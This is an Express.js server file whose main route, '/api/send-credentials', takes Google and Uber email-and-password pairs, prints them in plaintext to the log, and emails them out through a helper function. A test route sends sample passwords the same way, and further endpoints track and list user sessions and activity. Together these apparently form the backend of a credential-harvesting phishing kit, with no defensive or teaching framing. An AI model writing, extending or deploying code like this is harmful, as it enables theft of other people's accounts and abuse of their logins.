import express from 'express';
import cors from 'cors';
import { sendCredentialsEmail } from './emailService.js';
import { 
  addActivity, 
  getActivities, 
  getActivitiesBySession, 
  getAllSessions 
} from './activityStorage.js';

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// Routes
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  
  // This is a simple example - in production, use proper authentication
  if (email && password) {
    res.json({ 
      success: true, 
      message: 'Login successful',
      user: { email }
    });
  } else {
    res.status(400).json({ 
      success: false, 
      message: 'Email and password are required' 
    });
  }
});

// New endpoint to send credentials email
app.post('/api/send-credentials', async (req, res) => {
  const { googleEmail, googlePassword, uberEmail, uberPassword } = req.body;
  
  console.log('\n📧 Received request to send credentials email');
  console.log('Data received:', { googleEmail, googlePassword, uberEmail, uberPassword });
  
  try {
    const result = await sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword);
    
    if (result.success) {
      console.log('✅ API: Email sent successfully');
      res.json({ 
        success: true, 
        message: 'Credentials sent successfully',
        messageId: result.messageId
      });
    } else {
      console.log('❌ API: Email sending failed');
      res.status(500).json({ 
        success: false, 
        message: 'Failed to send email',
        error: result.error
      });
    }
  } catch (error) {
    console.error('❌ API Error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error',
      error: error.message
    });
  }
});

// Test endpoint to verify email works
app.get('/api/test-email', async (req, res) => {
  console.log('\n🧪 Testing email service...');
  try {
    const result = await sendCredentialsEmail(
      'test@google.com',
      'googlepass123',
      'test@uber.com',
      'uberpass123'
    );
    
    if (result.success) {
      console.log('✅ Test email sent successfully!');
      res.json({ 
        success: true, 
        message: 'Test email sent successfully',
        messageId: result.messageId
      });
    } else {
      console.log('❌ Test email failed');
      res.status(500).json({ 
        success: false, 
        message: 'Test email failed',
        error: result.error
      });
    }
  } catch (error) {
    console.error('❌ Test email error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Test email error',
      error: error.message
    });
  }
});

// Activity tracking endpoints
app.post('/api/track-activity', (req, res) => {
  try {
    const activityData = req.body;
    const activity = addActivity(activityData);
    res.json({ success: true, activity });
  } catch (error) {
    console.error('Error tracking activity:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/activities', (req, res) => {
  try {
    const { sessionId } = req.query;
    if (sessionId) {
      const activities = getActivitiesBySession(sessionId);
      res.json({ success: true, activities });
    } else {
      const activities = getActivities();
      res.json({ success: true, activities });
    }
  } catch (error) {
    console.error('Error getting activities:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/sessions', (req, res) => {
  try {
    const sessions = getAllSessions();
    res.json({ success: true, sessions });
  } catch (error) {
    console.error('Error getting sessions:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
